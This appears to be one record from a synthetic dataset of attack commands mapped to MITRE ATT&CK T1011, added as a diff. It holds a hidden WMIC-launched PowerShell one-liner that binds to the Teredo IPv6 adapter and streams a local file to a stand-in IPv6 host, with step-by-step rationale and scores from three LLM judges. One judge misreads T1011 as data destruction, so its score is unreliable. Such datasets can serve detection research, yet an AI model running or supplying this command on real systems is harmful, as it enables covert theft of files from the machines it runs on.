@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Teredo*') }; if(`$ifc){ `$ip6=@(`$ifc.IPAddress | ?{ `$_ -like '*:*' })[0]; if(`$ip6){ `$c=New-Object Net.Sockets.TcpClient([Net.Sockets.AddressFamily]::InterNetworkV6); `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip6),0))); `$rv6=[Net.IPAddress]::Parse('2001:db8::50'); `$c.Connect(`$rv6,53456); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\ProgramData\\Diagnostics\\etl.bin'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
+  "explanation": "Starts a hidden PowerShell via WMIC that binds an IPv6 TCP client to the Teredo tunneling interface and exfiltrates a file to an IPv6 address on a high port. This uses an IPv6 tunnel as an alternate medium in line with T1011.",
+  "rationale_steps": [
+    "Query for the Teredo tunneling adapter and obtain its IPv6 address.",
+    "Create an IPv6 TCP client and bind it to the Teredo-local address.",
+    "Connect to an IPv6 external host on an uncommon port.",
+    "Stream file data through the Teredo path, separate from primary IPv4 LAN.",
+    "Limit scope to the process, avoiding global network changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-987933e0-e336a109",
+  "source_prompt_hash": "987933e0",
+  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, backticks, parentheses, and braces, with correct PowerShell syntax throughout including proper variable declarations, method calls, and pipeline operations.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements exfiltration over an alternative protocol (IPv6 Teredo tunneling) as described in T1011, though it uses file exfiltration rather than data destruction which doesn't align with the technique description provided.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:38:39.182565Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, uses proper escaping for nested PowerShell within WMIC, and contains valid PowerShell syntax for all operations, including variable assignment, WMI queries, object creation, and network communication.",
+        "semantic_score": 1,
+        "semantic_justification": "The command explicitly performs data exfiltration by reading a file and writing its contents to a network stream, which directly contradicts the intent of MITRE ATT&CK T1011 (Data Destruction).",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T02:38:48.821959Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "Balanced quoting and delimiters with a parseable PowerShell payload; backticks before variables are unconventional but likely harmless.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements IPv6/Teredo-bound TCP exfiltration of a file as claimed (aligned with T1011), though it depends on a Teredo adapter and a reachable IPv6 target.",
+        "combined_score": 4.0,
+        "confidence": 0.76,
+        "timestamp": "2025-10-02T02:40:05.641971Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 3.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
